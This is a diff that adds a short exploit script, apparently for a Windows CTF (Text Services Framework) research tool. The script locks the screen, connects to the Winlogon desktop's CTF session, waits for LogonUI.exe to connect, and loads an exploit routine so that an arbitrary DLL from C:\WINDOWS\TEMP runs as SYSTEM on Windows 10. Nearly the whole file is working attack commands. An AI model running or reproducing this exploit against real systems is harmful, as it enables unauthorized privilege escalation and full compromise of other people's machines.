@@ -1,0 +1,28 @@
+# This script launches loads an arbitrary dll as SYSTEM on win10 x64 by
+# switching to the Winlogon Desktop, and then exploiting the login screen
+# via the CTF session.
+
+print
+print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+print !!! THIS EXPLOIT REQUIRES C:\WINDOWS\TEMP\EXPLOIT.DLL TO EXIST !!!
+print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+print
+print The screen will lock to trigger the login screen in 5 seconds...
+
+sleep 5000
+
+# We trigger the login using SendInput(VK_ESCAPE), this doesn't require
+# any privileges because we still own the Desktop until then.
+lock
+
+# Connect to the ctf service for the Winlogon desktop.
+connect Winlogon sid
+
+# List all the avaialble clients.
+scan
+
+# Wait for the desired victim process to connect and make it the default thread.
+wait LogonUI.exe
+
+# Now that we're connected and have a target selected, load the exploit script.
+script scripts\ctf-exploit-common-1903.ctf
